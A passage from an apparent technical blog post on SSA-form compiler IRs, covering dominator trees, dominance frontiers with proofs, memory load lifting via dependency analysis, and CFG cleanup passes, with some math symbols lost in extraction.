    &lt;p&gt;If a block &lt;code&gt;@a&lt;/code&gt; is a transitive pred of a block &lt;code&gt;@b&lt;/code&gt;, we say that &lt;code&gt;@a&lt;/code&gt; weakly dominates &lt;code&gt;@b&lt;/code&gt;, or that it is a weak dominator of &lt;code&gt;@b&lt;/code&gt;. For example, &lt;code&gt;@entry&lt;/code&gt;, &lt;code&gt;@loop.start&lt;/code&gt; and &lt;code&gt;@loop.body&lt;/code&gt; both weakly dominate &lt;code&gt;@exit&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;However, this is not usually an especially useful relationship. Instead, we want to speak of dominators:&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;A block&lt;/p&gt;&lt;code&gt;@a&lt;/code&gt;is a dominator (or dominates)&lt;code&gt;@b&lt;/code&gt;if every pred of&lt;code&gt;@b&lt;/code&gt;is dominated by&lt;code&gt;@a&lt;/code&gt;, or if&lt;code&gt;@a&lt;/code&gt;is&lt;code&gt;@b&lt;/code&gt;itself.&lt;p&gt;Equivalently, the dominator set of&lt;/p&gt;&lt;code&gt;@b&lt;/code&gt;is the intersection of the dominator sets of its preds, plus&lt;code&gt;@b&lt;/code&gt;.&lt;/quote&gt;
    &lt;p&gt;The dominance relation has some nice order properties that are necessary for defining the core graph algorithms of SSA.&lt;/p&gt;
    &lt;head rend="h3"&gt;Some Graph Theory&lt;/head&gt;
    &lt;p&gt;We only consider CFGs which are flowgraphs, that is, all blocks are reachable from the root block &lt;code&gt;@entry&lt;/code&gt;, which has no preds. This is necessary to eliminate some pathological graphs from our proofs. Importantly, we can always ask for an acyclic path11 from &lt;code&gt;@entry&lt;/code&gt; to any block &lt;code&gt;@b&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;An equivalent way to state the dominance relationship is that from every path from &lt;code&gt;@entry&lt;/code&gt; to &lt;code&gt;@b&lt;/code&gt; contains all of &lt;code&gt;@b&lt;/code&gt;’s dominators.&lt;/p&gt;
    &lt;quote&gt;&lt;code&gt;@a&lt;/code&gt;dominates&lt;code&gt;@b&lt;/code&gt;iff every path from&lt;code&gt;@entry&lt;/code&gt;to&lt;code&gt;@b&lt;/code&gt;contains&lt;code&gt;@a&lt;/code&gt;.&lt;p&gt;First, assume every&lt;/p&gt;&lt;code&gt;@entry&lt;/code&gt;to&lt;code&gt;@b&lt;/code&gt;path contains&lt;code&gt;@a&lt;/code&gt;. If&lt;code&gt;@b&lt;/code&gt;is&lt;code&gt;@a&lt;/code&gt;, we’re done. Otherwise we need to prove each predecessor of&lt;code&gt;@b&lt;/code&gt;is dominated by&lt;code&gt;@a&lt;/code&gt;; we do this by induction on the length of acyclic paths from&lt;code&gt;@entry&lt;/code&gt;to&lt;code&gt;@b&lt;/code&gt;. Consider preds&lt;code&gt;@p&lt;/code&gt;of&lt;code&gt;@b&lt;/code&gt;that are not&lt;code&gt;@a&lt;/code&gt;, and consider all acyclic paths from&lt;code&gt;@entry&lt;/code&gt;to&lt;code&gt;@p&lt;/code&gt;; by appending&lt;code&gt;@b&lt;/code&gt;to them, we have an acyclic path from&lt;code&gt;@entry&lt;/code&gt;to&lt;code&gt;@b&lt;/code&gt;, which must contain&lt;code&gt;@a&lt;/code&gt;. Because both the last and second-to-last elements of this are not&lt;code&gt;@a&lt;/code&gt;, it must be within the shorter path which is shorter than . Thus, by induction,&lt;code&gt;@a&lt;/code&gt;dominates&lt;code&gt;@p&lt;/code&gt;and therefore&lt;code&gt;@b&lt;/code&gt;&lt;p&gt;Going the other way, if&lt;/p&gt;&lt;code&gt;@a&lt;/code&gt;dominates&lt;code&gt;@b&lt;/code&gt;, and consider a path from&lt;code&gt;@entry&lt;/code&gt;to&lt;code&gt;@b&lt;/code&gt;. The second-to-last element of is a pred&lt;code&gt;@p&lt;/code&gt;of&lt;code&gt;@b&lt;/code&gt;; if it is&lt;code&gt;@a&lt;/code&gt;we are done. Otherwise, we can consider the path made by deleting&lt;code&gt;@b&lt;/code&gt;at the end.&lt;code&gt;@p&lt;/code&gt;is dominated by&lt;code&gt;@a&lt;/code&gt;, and is shorter than , so we can proceed by induction as above.&lt;/quote&gt;
    &lt;p&gt;Onto those nice properties. Dominance allows us to take an arbitrarily complicated CFG and extract from it a DAG, composed of blocks ordered by dominance.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;The dominance relation is a partial order.&lt;/p&gt;&lt;p&gt;Dominance is reflexive and transitive by definition, so we only need to show blocks can’t dominate each other.&lt;/p&gt;&lt;p&gt;Suppose distinct&lt;/p&gt;&lt;code&gt;@a&lt;/code&gt;and&lt;code&gt;@b&lt;/code&gt;dominate each other.Pick an acyclic path from&lt;code&gt;@entry&lt;/code&gt;to&lt;code&gt;@a&lt;/code&gt;. Because&lt;code&gt;@b&lt;/code&gt;dominates&lt;code&gt;@a&lt;/code&gt;, there is a prefix of this path ending in&lt;code&gt;@b&lt;/code&gt;. But because&lt;code&gt;@a&lt;/code&gt;dominates&lt;code&gt;@b&lt;/code&gt;, some prefix of ends in&lt;code&gt;@a&lt;/code&gt;. But now must contain&lt;code&gt;@a&lt;/code&gt;twice, contradicting that it is acyclic.&lt;/quote&gt;
    &lt;p&gt;This allows us to write &lt;code&gt;@a &amp;lt; @b&lt;/code&gt; when &lt;code&gt;@a&lt;/code&gt; dominates &lt;code&gt;@b&lt;/code&gt;. There is an even more refined graph structure that we can build out of dominators, which follows immediately from the partial order theorem.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;The dominators of a basic block are totally ordered by the dominance relation.&lt;/p&gt;&lt;p&gt;Suppose&lt;/p&gt;&lt;code&gt;@a1 &amp;lt; @b&lt;/code&gt;and&lt;code&gt;@a2 &amp;lt; @b&lt;/code&gt;, but neither dominates the other. Then, there must exist acyclic paths from&lt;code&gt;@entry&lt;/code&gt;to&lt;code&gt;@b&lt;/code&gt;which contain both, but in different orders. Take the subpaths of those paths which follow&lt;code&gt;@entry ... @a1&lt;/code&gt;, and&lt;code&gt;@a1 ... @b&lt;/code&gt;, neither of which contains&lt;code&gt;@a2&lt;/code&gt;. Concatenating these paths yields a path from&lt;code&gt;@entry&lt;/code&gt;to&lt;code&gt;@b&lt;/code&gt;that does not contain&lt;code&gt;@a2&lt;/code&gt;, a contradiction.&lt;/quote&gt;
    &lt;p&gt;This tells us that the DAG we get from the dominance relation is actually a tree, rooted at &lt;code&gt;@entry&lt;/code&gt;. The parent of a node in this tree is called its immediate dominator.&lt;/p&gt;
    &lt;p&gt;Computing dominators can be done iteratively: the dominator set of a block &lt;code&gt;@b&lt;/code&gt; is the intersection the dominator sets of its preds, plus &lt;code&gt;@b&lt;/code&gt;. This algorithm runs in quadratic time.&lt;/p&gt;
    &lt;p&gt;A better algorithm is the Lengauer-Tarjan algorithm[^lta]. It is relatively simple, but explaining how to implement it is a bit out of scope for this article. I found a nice treatment of it here.&lt;/p&gt;
    &lt;p&gt;What’s important is we can compute the dominator tree without breaking the bank, and given any node, we can ask for its immediate dominator. Using immediate dominators, we can introduce the final, important property of dominators.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;The dominance frontier of a block&lt;/p&gt;&lt;code&gt;@a&lt;/code&gt;is the set of all blocks not dominated by&lt;code&gt;@a&lt;/code&gt;with at least one pred which&lt;code&gt;@a&lt;/code&gt;dominates.&lt;/quote&gt;
    &lt;p&gt;These are points where control flow merges from distinct paths: one containing &lt;code&gt;@a&lt;/code&gt; and one not. The dominance frontier of &lt;code&gt;@loop.body&lt;/code&gt; is &lt;code&gt;@loop.start&lt;/code&gt;, whose preds are &lt;code&gt;@entry&lt;/code&gt; and &lt;code&gt;@loop.body&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;There are many ways to calculate dominance frontiers, but with a dominance tree in hand, we can do it like this:&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;For each block&lt;/p&gt;&lt;code&gt;@b&lt;/code&gt;with more than one pred, for each of its preds, let&lt;code&gt;@p&lt;/code&gt;be that pred. Add&lt;code&gt;@b&lt;/code&gt;to the dominance frontier of&lt;code&gt;@p&lt;/code&gt;and all of its dominators, stopping when encountering&lt;code&gt;@b&lt;/code&gt;’ immediate dominator.&lt;p&gt;We need to prove that every block examined by the algorithm winds up in the correct frontiers.&lt;/p&gt;&lt;p&gt;First, we check that every examined block&lt;/p&gt;&lt;code&gt;@b&lt;/code&gt;is added to the correct frontier. If&lt;code&gt;@a &amp;lt; @p&lt;/code&gt;, where&lt;code&gt;@p&lt;/code&gt;is a pred of&lt;code&gt;@b&lt;/code&gt;, and a&lt;code&gt;@d&lt;/code&gt;is&lt;code&gt;@b&lt;/code&gt;’s immediate dominator, then if&lt;code&gt;@a &amp;lt; @d&lt;/code&gt;,&lt;code&gt;@b&lt;/code&gt;is not in its frontier, because&lt;code&gt;@a&lt;/code&gt;must dominate&lt;code&gt;@b&lt;/code&gt;. Otherwise,&lt;code&gt;@b&lt;/code&gt;must be in&lt;code&gt;@a&lt;/code&gt;’s frontier, because&lt;code&gt;@a&lt;/code&gt;dominates a pred but it cannot dominate&lt;code&gt;@b&lt;/code&gt;, because then it would be dominated by&lt;code&gt;@i&lt;/code&gt;, a contradiction.&lt;p&gt;Second, we check that every frontier is complete. Consider a block&lt;/p&gt;&lt;code&gt;@a&lt;/code&gt;. If an examined block&lt;code&gt;@b&lt;/code&gt;is in its frontier, then&lt;code&gt;@a&lt;/code&gt;must be among the dominators of some pred&lt;code&gt;@p&lt;/code&gt;, and it must be dominated by&lt;code&gt;@b&lt;/code&gt;’s immediate dominator; otherwise,&lt;code&gt;@a&lt;/code&gt;would dominate&lt;code&gt;@b&lt;/code&gt;(and thus&lt;code&gt;@b&lt;/code&gt;would not be in its frontier). Thus,&lt;code&gt;@b&lt;/code&gt;gets added to&lt;code&gt;@a&lt;/code&gt;’s dominator.&lt;/quote&gt;
    &lt;p&gt;You might notice that all of these algorithms are quadratic. This is actually a very good time complexity for a compilers-related graph algorithm. Cubic and quartic algorithms are not especially uncommon, and yes, your optimizing compiler’s time complexity is probably cubic or quartic in the size of the program!&lt;/p&gt;
    &lt;head rend="h2"&gt;Lifting Memory&lt;/head&gt;
    &lt;p&gt;Ok. Let’s construct an optimization. We want to figure out if we can replace a load from a pointer with the most recent store to that pointer. This will allow us to fully lift values out of memory by cancelling out store/load pairs.&lt;/p&gt;
    &lt;p&gt;This will make use of yet another implicit graph data structure.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;The dataflow graph is the directed graph made up of the internal circuit graphs of each each basic block, connected along block arguments.&lt;/p&gt;
      &lt;p&gt;To follow a use-def chain is to walk this graph forward from an operation to discover operations that potentially depend on it, or backwards to find operations it potentially depends on.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;It’s important to remember that the dataflow graph, like the CFG, does not have a well defined “up” direction. Navigating it and the CFG requires the dominator tree.&lt;/p&gt;
    &lt;p&gt;One other important thing to remember here is that every instruction in a basic block always executes if the block executes. In much of this analysis, we need to appeal to “program order” to select the last load in a block, but we are always able to do so. This is an important property of basic blocks that makes them essential for constructing optimizations.&lt;/p&gt;
    &lt;head rend="h3"&gt;Forward Dataflow&lt;/head&gt;
    &lt;p&gt;For a given &lt;code&gt;store %p, %v&lt;/code&gt;, we want to identify all loads that depend on it. We can follow the use-def chain of &lt;code&gt;%p&lt;/code&gt; to find which blocks contain loads that potentially depend on the store (call it &lt;code&gt;%s&lt;/code&gt;).&lt;/p&gt;
    &lt;p&gt;First, we can eliminate loads within the same basic block (call it &lt;code&gt;@a&lt;/code&gt;). Replace all &lt;code&gt;load %p&lt;/code&gt; instructions after &lt;code&gt;s&lt;/code&gt; (but before any other &lt;code&gt;store %p, _&lt;/code&gt;s, in program order) with &lt;code&gt;%v&lt;/code&gt;’s def. If &lt;code&gt;s&lt;/code&gt; is not the last store in this block, we’re done.&lt;/p&gt;
    &lt;p&gt;Otherwise, follow the use-def chain of &lt;code&gt;%p&lt;/code&gt; to successors which use &lt;code&gt;%p&lt;/code&gt;, i.e., successors whose &lt;code&gt;goto&lt;/code&gt; case has &lt;code&gt;%p&lt;/code&gt; as at least one argument. Recurse into those successors, and now replacing the pointer &lt;code&gt;%p&lt;/code&gt; of interest with the parameters of the successor which were set to &lt;code&gt;%p&lt;/code&gt; (more than one argument may be &lt;code&gt;%p&lt;/code&gt;).&lt;/p&gt;
    &lt;p&gt;If successor &lt;code&gt;@b&lt;/code&gt; loads from one of the registers holding &lt;code&gt;%p&lt;/code&gt;, replace all such loads before a store to &lt;code&gt;%p&lt;/code&gt;. We also now need to send &lt;code&gt;%v&lt;/code&gt; into &lt;code&gt;@b&lt;/code&gt; somehow.&lt;/p&gt;
    &lt;p&gt;This is where we run into something of a wrinkle. If &lt;code&gt;@b&lt;/code&gt; has exactly one predecessor, we need to add a new block argument to pass whichever register is holding &lt;code&gt;%v&lt;/code&gt; (which exists by induction). If &lt;code&gt;%v&lt;/code&gt; is already passed into &lt;code&gt;@b&lt;/code&gt; by another argument, we can use that one.&lt;/p&gt;
    &lt;p&gt;However, if &lt;code&gt;@b&lt;/code&gt; has multiple predecessors, we need to make sure that every path from &lt;code&gt;@a&lt;/code&gt; to &lt;code&gt;@b&lt;/code&gt; sends &lt;code&gt;%v&lt;/code&gt;, and canonicalizing those will be tricky. Worse still, if &lt;code&gt;@b&lt;/code&gt; is in &lt;code&gt;@a&lt;/code&gt;’s domination frontier, a different store could be contributing to that load! For this reason, dataflow from stores to loads is not a great strategy.&lt;/p&gt;
    &lt;p&gt;Instead, we’ll look at dataflow from loads backwards to stores (in general, dataflow from uses to defs tends to be more useful), which we can use to augment the above forward dataflow analysis to remove the complex issues around domination frontiers.&lt;/p&gt;
    &lt;head rend="h3"&gt;Dependency Analysis&lt;/head&gt;
    &lt;p&gt;Let’s analyze loads instead. For each &lt;code&gt;load %p&lt;/code&gt; in &lt;code&gt;@a&lt;/code&gt;, we want to determine all stores that could potentially contribute to its value. We can find those stores as follows:&lt;/p&gt;
    &lt;p&gt;We want to be able to determine which register in a given block corresponds to the value of &lt;code&gt;%p&lt;/code&gt;, and then find its last store in that block.&lt;/p&gt;
    &lt;p&gt;To do this, we’ll flood-fill the CFG backwards in BFS order. This means that we’ll follow preds (through the use-def chain) recursively, visiting each pred before visiting their preds, and never revisiting a basic block (except we may need to come back to &lt;code&gt;@a&lt;/code&gt; at the end).&lt;/p&gt;
    &lt;p&gt;Determining the “equivalent”12 of &lt;code&gt;%p&lt;/code&gt; in &lt;code&gt;@b&lt;/code&gt; (we’ll call it &lt;code&gt;%p.b&lt;/code&gt;) can be done recursively: while examining &lt;code&gt;@b&lt;/code&gt;, follow the def of &lt;code&gt;%p.b&lt;/code&gt;. If &lt;code&gt;%p.b&lt;/code&gt; is a block parameter, for each pred &lt;code&gt;@c&lt;/code&gt;, set &lt;code&gt;%p.c&lt;/code&gt; to the corresponding argument in the &lt;code&gt;@b(...)&lt;/code&gt; case in &lt;code&gt;@c&lt;/code&gt;’s &lt;code&gt;goto&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Using this information, we can collect all stores that the load potentially depends on. If a predecessor &lt;code&gt;@b&lt;/code&gt; stores to &lt;code&gt;%p.b&lt;/code&gt;, we add the last such store in &lt;code&gt;@b&lt;/code&gt; (in program order) to our set of stores, and do not recurse to &lt;code&gt;@b&lt;/code&gt;’s preds (because this store overwrites all past stores). Note that we may revisit &lt;code&gt;@a&lt;/code&gt; in this process, and collect a store to &lt;code&gt;%p&lt;/code&gt; from it occurs in the block. This is necessary in the case of loops.&lt;/p&gt;
    &lt;p&gt;The result is a set &lt;code&gt;stores&lt;/code&gt; of &lt;code&gt;(store %p.s %v.s, @s)&lt;/code&gt; pairs. In the process, we also collected a set of all blocks visited, &lt;code&gt;subgraph&lt;/code&gt;, which are dominators of &lt;code&gt;@a&lt;/code&gt; which we need to plumb a &lt;code&gt;%v.b&lt;/code&gt; through. This process is called memory dependency analysis, and is a key component of many optimizations.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;Not all contributing operations are stores. Some may be references to globals (which we’re disregarding), or function arguments or the results of a function call (which means we probably can’t lift this load). For example&lt;/p&gt;&lt;code&gt;%p&lt;/code&gt;gets traced all the way back to a function argument, there is a code path which loads from a pointer whose stores we can’t see.&lt;/quote&gt;
    &lt;p&gt;It may also trace back to a stack slot that is potentially not stored to. This means there is a code path that can potentially load uninitialized memory. Like LLVM, we can assume this is not observable behavior, so we can discount such dependencies. If all of the dependencies are uninitialized loads, we can potentially delete not just the load, but operations which depend on it (reverse dataflow analysis is the origin of so-called “time-traveling” UB).&lt;/p&gt;
    &lt;head rend="h3"&gt;Lifting Loads&lt;/head&gt;
    &lt;p&gt;Now that we have the full set of dependency information, we can start lifting loads. Loads can be safely lifted when all of their dependencies are stores in the current function, or dependencies we can disregard thanks to UB in the surface language (such as &lt;code&gt;null&lt;/code&gt; loads or uninitialized loads).&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;There is a lot of fuss in this algorithm about plumbing values through block arguments. A lot of IRs make a simplifying change, where every block implicitly receives the registers from its dominators as block arguments.&lt;/p&gt;
      &lt;p&gt;I am keeping the fuss because it makes it clearer what’s going on, but in practice, most of this plumbing, except at dominance frontiers, would be happening in the background.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Suppose we can safely lift some load. Now we need to plumb the stored values down to the load. For each block &lt;code&gt;@b&lt;/code&gt; in &lt;code&gt;subgraph&lt;/code&gt; (all other blocks will now be in &lt;code&gt;subgraph&lt;/code&gt; unless stated otherwise). We will be building two mappings: one &lt;code&gt;(@s, @b) -&amp;gt; %v.s.b&lt;/code&gt;, which is the register equivalent to &lt;code&gt;%v.s&lt;/code&gt; in that block. We will also be building a map &lt;code&gt;@b -&amp;gt; %v.b&lt;/code&gt;, which is the value that &lt;code&gt;%p&lt;/code&gt; must have in that block.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;p&gt;Prepare a work queue, with each&lt;/p&gt;&lt;code&gt;@s&lt;/code&gt;in it initially.&lt;/item&gt;
      &lt;item&gt;&lt;p&gt;Pop a block&lt;/p&gt;&lt;code&gt;@a&lt;/code&gt;form the queue. For each successor&lt;code&gt;@b&lt;/code&gt;(in&lt;code&gt;subgraph&lt;/code&gt;):&lt;list rend="ol"&gt;&lt;item&gt;&lt;p&gt;If&lt;/p&gt;&lt;code&gt;%v.b&lt;/code&gt;isn’t already defined, add it as a block argument. Have&lt;code&gt;@a&lt;/code&gt;pass&lt;code&gt;%v.a&lt;/code&gt;to that argument.&lt;/item&gt;&lt;item&gt;&lt;p&gt;If&lt;/p&gt;&lt;code&gt;@b&lt;/code&gt;hasn’t been visited yet, and isn’t the block containing the load we’re deleting, add it to the queue.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Once we’re done, if &lt;code&gt;@a&lt;/code&gt; is the block that contains the load, we can now replace all loads to &lt;code&gt;%p&lt;/code&gt; before any stores to &lt;code&gt;%p&lt;/code&gt; with &lt;code&gt;%v.a&lt;/code&gt;.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;There are cases where this whole process can be skipped, by applying a “peephole” optimization. For example, stores followed by loads within the same basic block can be optimized away locally, leaving the heavy-weight analysis for cross-block store/load pairs.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;head rend="h3"&gt;Worked Example&lt;/head&gt;
    &lt;p&gt;Here’s the result of doing dependency analysis on our Fibonacci function. Each load is annotated with the blocks and stores in &lt;code&gt;stores&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Let’s look at &lt;code&gt;L1&lt;/code&gt;. Is contributing loads are in &lt;code&gt;@entry&lt;/code&gt; and &lt;code&gt;@loop.body&lt;/code&gt;. So we add a new parameter &lt;code&gt;%n&lt;/code&gt;: in &lt;code&gt;@entry&lt;/code&gt;, we call that parameter with &lt;code&gt;%n&lt;/code&gt; (since that’s stored to it in &lt;code&gt;@entry&lt;/code&gt;), while in &lt;code&gt;@loop.body&lt;/code&gt;, we pass &lt;code&gt;%n.2&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;What about L4? The contributing loads are also in &lt;code&gt;@entry&lt;/code&gt; and &lt;code&gt;@loop.body&lt;/code&gt;, but one of those isn’t a pred of &lt;code&gt;@exit&lt;/code&gt;. &lt;code&gt;@loop.start&lt;/code&gt; is also in the subgraph for this load, though. So, starting from &lt;code&gt;@entry&lt;/code&gt;, we add a new parameter &lt;code&gt;%a&lt;/code&gt; to &lt;code&gt;@loop.body&lt;/code&gt; and feed &lt;code&gt;0&lt;/code&gt; (the stored value, an immediate this time) through it. Now looking at &lt;code&gt;@loop.body&lt;/code&gt;, we see there is already a parameter for this load (&lt;code&gt;%a&lt;/code&gt;), so we just pass &lt;code&gt;%b&lt;/code&gt; as that argument. Now we process &lt;code&gt;@loop.start&lt;/code&gt;, which &lt;code&gt;@entry&lt;/code&gt; pushed onto the queue. &lt;code&gt;@exit&lt;/code&gt; gets a new parameter &lt;code&gt;%a&lt;/code&gt;, which is fed &lt;code&gt;@loop.start&lt;/code&gt;’s own &lt;code&gt;%a&lt;/code&gt;. We do not re-process &lt;code&gt;@loop.body&lt;/code&gt;, even though it also appears in &lt;code&gt;@loop.start&lt;/code&gt;’s gotos, because we already visited it.&lt;/p&gt;
    &lt;p&gt;After doing this for the other two loads, we get this:&lt;/p&gt;
    &lt;p&gt;After lifting, if we know that a stack slot’s pointer does not escape (i.e., none of its uses wind up going into a function call13) or a write to a global (or a pointer that escapes), we can delete every store to that pointer. If we delete every store to a stack slot, we can delete the stack slot altogether (there should be no loads left for that stack slot at this point).&lt;/p&gt;
    &lt;head rend="h3"&gt;Complications&lt;/head&gt;
    &lt;p&gt;This analysis is simple, because it assumes pointers do not alias in general. Alias analysis is necessary for more accurate dependency analysis. This is necessary, for example, for lifting loads of fields of structs through subobject pointers, and dealing with pointer arithmetic in general.&lt;/p&gt;
    &lt;p&gt;However, our dependency analysis is robust to passing different pointers as arguments to the same block from different predecessors. This is the case that is specifically handled by all of the fussing about with dominance frontiers. This robustness ultimately comes from SSA’s circuital nature.&lt;/p&gt;
    &lt;p&gt;Similarly, this analysis needs to be tweaked to deal with something like &lt;code&gt;select %cond, %a, %b&lt;/code&gt; (a ternary, essentially). &lt;code&gt;select&lt;/code&gt;s of pointers need to be replaced with &lt;code&gt;select&lt;/code&gt;s of the loaded values, which means we need to do the lifting transformation “all at once”: lifting some liftable loads will leave the IR in an inconsistent state, until all of them have been lifted.&lt;/p&gt;
    &lt;head rend="h2"&gt;Cleanup Passes&lt;/head&gt;
    &lt;p&gt;Many optimizations will make a mess of the CFG, so it’s useful to have simple passes that “clean up” the mess left by transformations. Here’s some easy examples.&lt;/p&gt;
    &lt;head rend="h3"&gt;Unused Result Elimination&lt;/head&gt;
    &lt;p&gt;If an operation’s result has zero uses, and the operation has no side-effects, it can be deleted. This allows us to then delete operations that it depended on that now have no side effects. Doing this is very simple, due to the circuital nature of SSA: collect all instructions whose outputs have zero uses, and delete them. Then, examine the defs of their operands; if those operations now have no uses, delete them, and recurse.&lt;/p&gt;
    &lt;p&gt;This bubbles up all the way to block arguments. Deleting block arguments is a bit trickier, but we can use a work queue to do it. Put all of the blocks into a work queue.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;Pop a block from the queue.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Run unused result elimination on its operations.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;If it now has parameters with no uses, remove those parameters.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;For each pred, delete the corresponding arguments to this block. Then, Place those preds into the work queue (since some of their operations may have lost their last use).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;If there is still work left, go to 1.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Simplifying the CFG&lt;/head&gt;
    &lt;p&gt;There are many CFG configurations that are redundant and can be simplified to reduce the number of basic blocks.&lt;/p&gt;
    &lt;p&gt;For example, unreachable code can help delete blocks. Other optimizations may cause the &lt;code&gt;goto&lt;/code&gt; at the end of a function to be empty (because all of its successors were optimized away). We treat an empty &lt;code&gt;goto&lt;/code&gt; as being unreachable (since it has no cases!), so we can delete every operation in the block up to the last non-pure operation. If we delete every instruction in the block, we can delete the block entirely, and delete it from its preds’ &lt;code&gt;goto&lt;/code&gt;s. This is a form of dead code elimination, or DCE, which combines with the previous optimization to aggressively delete redundant code.&lt;/p&gt;
    &lt;p&gt;Some jumps are redundant. For example, if a block has exactly one pred and one successor, the pred’s &lt;code&gt;goto&lt;/code&gt; case for that block can be wired directly to the successor. Similarly, if two blocks are each other’s unique predecessor/successor, they can be fused, creating a single block by connecting the input blocks’ circuits directly, instead of through a &lt;code&gt;goto&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;If we have a ternary &lt;code&gt;select&lt;/code&gt; operation, we can do more sophisticated fusion. If a block has two successors, both of which the same unique successor, and those successors consist only of gotos, we can fuse all four blocks, replacing the CFG diamond with a &lt;code&gt;select&lt;/code&gt;. In terms of C, this is this transformation:&lt;/p&gt;
    &lt;p&gt;LLVM’s CFG simplification pass is very sophisticated and can eliminate complex forms of control flow.&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;I am hoping to write more about SSA optimization passes. This is a very rich subject, and viewing optimizations in isolation is a great way to understand how a sophisticated optimization pipeline is built out of simple, dumb components.&lt;/p&gt;
    &lt;p&gt;It’s also a practical application of graph theory that shows just how powerful it can be, and (at least in my opinion), is an intuitive setting for understanding graph theory, which can feel very abstract otherwise.&lt;/p&gt;
    &lt;p&gt;In the future, I’d like to cover CSE/GVN, loop optimizations, and, if I’m feeling brave, getting out of SSA into a finite-register machine (backends are not my strong suit!).&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;Specifically the Swift frontend before lowering into LLVM IR. ↩&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Microsoft Visual C++, a non-conforming C++ compiler sold by Microsoft ↩&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;HotSpot is the JVM implementation provided by OpenJDK; C2 is the “second compiler”, which has the best performance among HotSpot’s Java execution engines. ↩&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;V8 is Chromium’s JavaScript runtime. ↩&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;SpiderMonkey is Firefox’s JavaScript runtime. ↩&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The Android Runtime (ART) is the “JVM” (scare quotes) on the Android platform. ↩&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;The Glasgow Haskell Compiler (GHC), does not use SSA; it (like some other pure-functional languages) uses a continuation-oriented IR (compare to Scheme’s&lt;/p&gt;&lt;code&gt;call/cc&lt;/code&gt;). ↩&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Every compiler person firmly believes that , because program optimization is full of NP-hard problems and we would have definitely found polynomial ideal register allocation by now if it existed. ↩&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;Some more recent IRs use a different version of SSA called “structured control flow”, or SCF. Wasm is a notable example of an SCF IR. SSA-SCF is equivalent to SSA-CFG, and polynomial time algorithms exist for losslessly converting between them (LLVM compiling Wasm, for example, converts its CFG into SCF using a “relooping algorithm”).&lt;/p&gt;&lt;p&gt;In SCF, operations like switch statements and loops are represented as macro operations that contain basic blocks. For example, a&lt;/p&gt;&lt;code&gt;switch&lt;/code&gt;operation might take a value as input, select a basic block to execute based on that, and return the value that basic block evaluates to as its output.&lt;p&gt;RVSDG is a notable innovation in this space, because it allows circuit analysis of entire imperative programs.&lt;/p&gt;&lt;p&gt;I am convering SSA-CFG instead of SSA-SCF simply because it’s more common, and because it’s what LLVM IR is.&lt;/p&gt;&lt;p&gt;See also this MLIR presentation for converting between the two. ↩&lt;/p&gt;&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Tail calling is when a function call is the last operation in a function; this allows the caller to jump directly to the callee, recycling its own stack frame for it instead of requiring it to allocate its own. ↩&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;Given any path from&lt;/p&gt;&lt;code&gt;@a&lt;/code&gt;to&lt;code&gt;@b&lt;/code&gt;, we can make it acyclic by replacing each subpath from&lt;code&gt;@c&lt;/code&gt;to&lt;code&gt;@c&lt;/code&gt;with a single&lt;code&gt;@c&lt;/code&gt;node. ↩&lt;/item&gt;
      &lt;item&gt;&lt;p&gt;When moving from a basic block to a pred, a register in that block which is defined as a block parameter corresponds to some register (or immediate) in each predecessor. That is the “equivalent” of&lt;/p&gt;&lt;code&gt;%p&lt;/code&gt;.&lt;p&gt;One possible option for the “equivalent” is an immediate: for example,&lt;/p&gt;&lt;code&gt;null&lt;/code&gt;or the address of a global. In the case of a global&lt;code&gt;&amp;amp;g&lt;/code&gt;, assuming no data races, we would instead need alias information to tell if stores to this global within the current function (a) exist and (b) are liftable at all.&lt;p&gt;If the equivalent is&lt;/p&gt;&lt;code&gt;null&lt;/code&gt;, we can proceed in one of two ways depending on optimization level. If we want loads of&lt;code&gt;null&lt;/code&gt;to trap (as in Go), we need to mark this load as not being liftable, because it may trap. If we want loads of&lt;code&gt;null&lt;/code&gt;to be UB, we simply ignore that pred, because we can assume (for our analysis) that if the pointer 